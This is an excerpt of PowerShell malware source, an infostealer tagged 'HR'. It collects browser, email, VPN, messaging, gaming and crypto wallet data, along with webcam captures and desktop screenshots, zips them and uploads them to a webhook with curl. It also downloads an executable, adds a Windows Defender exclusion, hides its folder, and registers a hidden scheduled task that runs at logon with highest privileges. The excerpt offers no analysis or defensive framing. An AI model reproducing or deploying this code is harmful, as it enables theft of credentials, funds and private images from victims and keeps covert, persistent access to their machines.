...
function Backup-Data {
    $folder_general = "$env:APPDATA\HR\DATA"
    $folder_messaging = "$env:APPDATA\HR\DATA\Messaging Sessions"
    $folder_gaming = "$env:APPDATA\HR\DATA\Gaming Sessions"
    $folder_crypto = "$env:APPDATA\HR\DATA\Crypto Wallets"
	$folder_vpn = "$env:APPDATA\HR\DATA\VPN Clients"
    $folder_email = "$env:APPDATA\HR\DATA\Email Clients"
    $important_files = "$env:APPDATA\HR\DATA\Important Files"
	$browser_data = "$env:APPDATA\HR\DATA\Browser Data"
    ...
    # made by https://raw.githubusercontent.com/WTC-HR/RH_1738Gz/main/Get-WebCamp.ps1
    $source=@" 
    using System; 
...
"@ 
 ...
 try {Get-WebCamImage} catch {}
    ...
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"HR\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
    ...
    (New-Object System.Net.WebClient).DownloadFile("dof", "$env:LOCALAPPDATA\Temp\main.exe")
    ...
    curl.exe -F "payload_json={\`"username\`": \`"HR\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$main_temp\desktop-screenshot.png\`"" $webhook | out-null
    ...
    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\HR.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"HR\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\HR.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\HR.zip" -Force
...
function Invoke-TASKS {
    ...
    Add-MpPreference -ExclusionPath "$env:APPDATA\HR"
    New-Item -ItemType Directory -Path "$env:APPDATA\HR" -Force
    # Hidden Directory
    $HR_DIR = get-item "$env:APPDATA\HR" -Force
    $HR_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\HR\HR.ps1" -Force
    $task_name = "HR"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\HR\HR.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "HR" -RunLevel Highest -Force
    Backup-Data
}
